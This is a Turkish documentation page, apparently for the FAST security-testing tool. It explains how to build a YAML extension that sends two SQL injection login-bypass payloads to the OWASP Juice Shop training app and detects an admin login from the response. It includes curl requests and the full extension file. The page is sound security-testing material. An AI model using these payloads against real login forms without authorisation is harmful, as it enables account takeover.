[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section  
[link-send-headers]:        ../phase-send.md  
[link-using-extension]:     ../using-extension.md  
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md  
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project



# Değişiklik Yapmayan Eklentinin Oluşturulması

Bu belgede tanımlanan eklenti, gelen temel isteğe bazı yükler enjekte etmek amacıyla değiştirilmez. Bunun yerine, temel istekte belirtilen ana makineye iki önceden tanımlanmış test isteği gönderilecektir. Bu test istekleri, hedef uygulamanın [“OWASP Juice Shop”][link-juice-shop] giriş formundaki SQLi açığının istismarına yol açabilecek yükleri içermektedir.


## Hazırlıklar

FAST eklentisi oluşturulmadan önce, hedef uygulamanın davranışını [incelemeniz][link-app-examination] şiddetle tavsiye edilir.


## Eklenti Oluşturma

Eklentiyi tanımlayan (ör., `non-mod-extension.yaml`) bir dosya oluşturun ve gerekli bölümlerle doldurun:

1.  [**The `meta-info` section**][link-meta-info].

    Eklentinin tespit etmeye çalışacağı açığın tanımını hazırlayın.
    
    * açık başlığı: `OWASP Juice Shop SQLi (non-mod extension)`
    * açık açıklaması: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * açık türü: SQL injection
    * açık tehdit seviyesi: yüksek
    
    İlgili `meta-info` bölümünün görünümü aşağıdaki gibidir:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **The `send` section, the [Send phase][doc-send-phase]**

    Hedef uygulamadaki SQL injection açığını istismar etmek için, herhangi bir `password` değeri ile birlikte `email` parametresi değeri olarak gönderilmesi gereken iki payload bulunmaktadır:
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    İki test isteği oluşturabilirsiniz; her biri:
    
    * Yukarıda tanımlanan değerlerden biriyle `email` parametresine sahip ve 
    * Rasgele bir değerle `password` parametresine sahip olacaktır.

    Örnek hedef uygulama (OWASP Juice Shop) üzerinde test gerçekleştirmek için bu isteklerden yalnızca birini kullanmak yeterlidir.
    
    Ancak, gerçek bir uygulamanın güvenlik testleri sırasında, birkaç hazır test isteğine sahip olmak faydalı olabilir: Uygulamadaki güncellemeler ve iyileştirmeler nedeniyle isteklerden biri artık bir açığı istismar edemiyorsa, diğer payload'lar sayesinde açığı hala istismar edebilecek başka test istekleri mevcut olacaktır.

    Yukarıdaki listedeki ilk payload içeren istek aşağıdakine benzer:
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    İkinci istek de ilkine benzer:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    Bu iki test isteğinin açıklamalarını içeren `send` bölümünü ekleyin:
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "Bir Not: `Host` Header Hakkında" 
        Bu isteklerde `Host` header atlanabilir çünkü bu belirli SQLi açığının istismarını etkilemez. Bir FAST düğümü, gelen temel isteklerden çıkarılan `Host` header'ı otomatik olarak ekleyecektir.
        
        Send aşamasının istek header'larını nasıl işlediğini [buradan][link-send-headers] okuyabilirsiniz.

3.  **The `detect` section, the [Detect phase][doc-detect-phase]**
    
    Aşağıdaki koşullar, yönetici haklarıyla kullanıcı doğrulamasının başarılı olduğunu gösterir:
    
    * Yanıt gövdesinde, `1` değeriyle alışveriş sepeti tanımlayıcı parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
        "bid":1
        ```
    
    * Yanıt gövdesinde, `admin@juice-sh.op` değeriyle kullanıcı e-posta parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Yukarıda tanımlanan koşullara göre saldırının başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Özel Karakterlerin Kaçırılması"  
    Dizgilerdeki özel karakterlerin kaçırılmasını unutmayın.

## Eklenti Dosyası

Artık `non-mod-extension.yaml` dosyası, eklentinin çalışması için gereken tüm bölümleri içeren eksiksiz bir yapıya sahiptir. Dosya içeriğinin listesi aşağıda gösterilmiştir:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

## Eklentiyi Kullanma

Oluşturulan eklentinin nasıl kullanılacağı hakkında detaylı bilgi için, [bu belgeyi][link-using-extension] okuyun.